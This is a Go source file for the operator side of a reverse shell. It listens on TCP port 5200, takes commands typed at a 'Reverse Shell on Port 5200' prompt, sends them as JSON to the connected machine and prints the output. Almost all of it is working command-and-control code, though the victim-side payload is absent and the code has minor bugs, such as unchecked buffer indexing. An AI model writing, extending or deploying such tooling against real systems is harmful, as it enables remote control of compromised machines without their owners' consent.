package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {

	listener, err := net.Listen("tcp", ":5200")

	if err != nil {
		fmt.Println("Something went wrong")
	}

	fmt.Println("Listening for connection")

	if err != nil {
		fmt.Println("Nope")
	} else {
		conn, _ := listener.Accept()
		fmt.Println(conn)
		target_communication(conn)
	}
}

func target_communication(conn net.Conn) {
	for {
		command := ""

		reader := bufio.NewReader(os.Stdin)

		fmt.Print("Reverse Shell on Port 5200: ")
		command, _ = reader.ReadString('\n')

		command = strings.Replace(command, "\n", "", -1)

		send_data(command, conn)

		if command == "quit" {
			break
		}
		receive_data(conn)

	}
}

func send_data(command string, conn net.Conn) {
	jsondata, _ := json.Marshal(command)
	conn.Write([]byte(jsondata))
}

func receive_data(conn net.Conn) {

	var buffer []byte = make([]byte, 1024)
	cargo, _ := conn.Read(buffer)

	for i := 0; i < cargo; i++ {
		if string(buffer[i]) == "\\" && string(buffer[i+1]) == "r" {
			fmt.Println()
			buffer[i+1] = 0
			fmt.Print()
		} else {
			fmt.Print(string(buffer[i]))
		}
	}
	fmt.Println()
}

